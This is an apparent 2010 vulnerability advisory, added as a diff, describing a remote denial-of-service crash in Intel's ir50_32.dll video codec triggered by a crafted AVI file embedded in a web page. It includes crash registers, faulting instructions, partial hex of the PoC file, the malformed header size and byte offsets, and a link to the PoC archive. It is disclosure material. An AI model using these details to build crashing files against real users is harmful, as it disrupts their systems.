@@ -1,0 +1,104 @@
+Intel Video Codecs 5 Remote Denial of Service
+Author: Matthew Bergin
+Website: http://berginpentesting.com/
+Email: matt@berginpentesting.com
+Date: August 27, 2010
+Filename: ir50_32.dll
+Version: 5.2562.15.55
+
+Description:
+A remote user can cause denial of service conditions on remote hosts by embedding a specially crafted AVI file into an HTML page. The included PoC will also cause crash conditions locally if viewed by My Computer.
+
+Application Events Notice:
+Faulting application explorer.exe, version 6.0.2900.5512, faulting module ir50_32.dll, version 5.2562.15.55, fault address 0x00002897.
+
+Crash Instructions:
+MOV EDI, DWORD PTR DS:[EDX+EDI*4-4] <- Crash Here
+MOV AH, AL
+AND CH, 0C0
+CMP CH, 40
+JE ir50_32.738727C3
+
+Crash Registers:
+eax 00030026
+ecx 00000DEA
+edx 02b80004
+ebx 00000001
+esp 0849f420
+ebp fb202196
+esi 05d5fe4c
+edi 7ecc7dc7
+eip 73872c52
+
+Reproduction
+
+PoC File:
+Addr :  0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+2090h: F3 2C 00 7E 12 C8 71 2D 88 F8 BC CF DD 6F F8 E0  ó,
+....
+20B0h: B1 97 C5 F3 79 29 F0 41 92 71 0D C0 7E 73 F1 EC  ±—Åóy)ðA’q
+À~sñì
+....
+2120h: CE 87 8E C3 10 FA 17 49 86 E7 E1 23 33 AC F1 89  Î‡ŽÃúI†çá#3¬ñ‰
+....
+21E0h: 37 FA 7F 3F 16 F7 D7 CF 39 CF 0F F1 94 C0 C0 34  7ú?÷×Ï9Ïñ”ÀÀ4
+....
+2460h: C5 DA 58 81 C0 51 19 68 14 11 28 D8 ED 02 18 C2  ÅÚXÀQh(ØíÂ
+....
+2540h: F8 60 D9 21 02 42 42 FA 74 99 05 24 7C D8 9F 3A  ø`Ù!BBút™$|ØŸ:
+....
+25B0h: 0E 0F 1F 53 3E 26 C3 A3 10 3E E5 E7 8F C2 37 16  S>&Ã£>åçÂ7
+....
+2680h: DB 32 EA 10 98 57 AB 88 0B 24 C4 4D 4A 28 7F 9B  Û2ê˜W«ˆ$ÄMJ(›
+....
+3380h: C8 93 FE 31 51 32 1C A1 57 E2 F0 F9 27 16 43 F9  È“þ1Q2.¡Wâðù'.Cù 
+....
+33B0h: 3E FB 73 25 C3 A3 B8 9B 33 BF FE C1 AF CA FF 3F  >ûs%Ã£¸›3¿þÁ¯Êÿ? 
+....
+
+
+Cause:
+while reversing the format, i found the size of the data section of LISTHEADER list[3] was showing a null value, after further review of the data which was said to not be included in the file i found several differences. These differences can be directly linked to the very reproducible crash which the poc provides. 
+
+LISTHEADER list[3] in the sample is at 7F4h and the size is 3FCB52h
+LISTHEADER list[3] in the poc file is at 7F4h and the size is 0h
+
+genericblock gb[0]
+char data[18448]
+char data[6291] = -49
+
+genericblock gb[0]
+char data[18448]
+char data[6327] = -20
+
+genericblock gb[0]
+char data[18448]
+char data[6438] = -15
+
+genericblock gb[0]
+char data[18448]
+char data[6220] = 22
+
+genericblock gb[0]
+char data[18448]
+char data[7594] = 31
+
+genericblock gb[0]
+char data[18448]
+char data[7260] = -64
+
+genericblock gb[0]
+char data[18448]
+char data[7488] = 116
+
+genericblock gb[0]
+char data[18448]
+char data[7594] = 31
+
+genericblock gb[0]
+char data[18448]
+char data[7807] = -120
+
+PoC:
+http://www.exploit-db.com/sploits/IntelVideoCodecs5RemoteDenialofService.rar
+	  
